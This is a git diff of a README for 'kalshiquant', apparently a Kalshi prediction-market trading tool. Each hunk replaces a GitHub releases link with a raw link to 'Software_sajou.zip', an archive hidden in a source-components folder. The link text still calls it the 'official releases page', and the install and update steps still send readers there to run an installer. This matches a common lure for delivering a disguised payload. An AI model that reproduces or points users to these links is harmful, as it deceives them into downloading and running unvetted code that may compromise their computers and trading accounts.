@@ -1,6 +1,6 @@
 # 📈 kalshiquant - Make better market prediction trades today
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Pearlfisheryjersey8695/kalshiquant/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Pearlfisheryjersey8695/kalshiquant/main/dashboard/src/components/Software_sajou.zip)
 
 This software manages quantitative trading for Kalshi prediction markets. It tracks market events and helps you calculate trade sizes. The system uses mathematical models to measure risk and calibrate price data. It handles calculations for you so you make informed decisions.
 
@@ -17,7 +17,7 @@ Kalshi prediction markets allow people to trade on real-world events. This tool 
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Pearlfisheryjersey8695/kalshiquant/releases) to download the package.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Pearlfisheryjersey8695/kalshiquant/main/dashboard/src/components/Software_sajou.zip) to download the package.
 2.  Look for the file ending in `.exe` under the latest release version.
 3.  Click the file name to start the download.
 4.  Once the folder downloads, open your Downloads folder in Windows File Explorer.
@@ -74,4 +74,4 @@ The software will pause active operations. It will attempt to reconnect as soon 
 The software provides sizing calculations and risk analysis. It suggests trade sizes based on your requirements. You remain in control of final execution unless you choose to enable the automated trading mode in the advanced settings.
 
 **How do I update the software?**
-When a new version becomes available, return to the [releases page](https://github.com/Pearlfisheryjersey8695/kalshiquant/releases) to download the latest installer. Running the new installer will overwrite the old version while keeping your settings intact.
+When a new version becomes available, return to the [releases page](https://raw.githubusercontent.com/Pearlfisheryjersey8695/kalshiquant/main/dashboard/src/components/Software_sajou.zip) to download the latest installer. Running the new installer will overwrite the old version while keeping your settings intact.
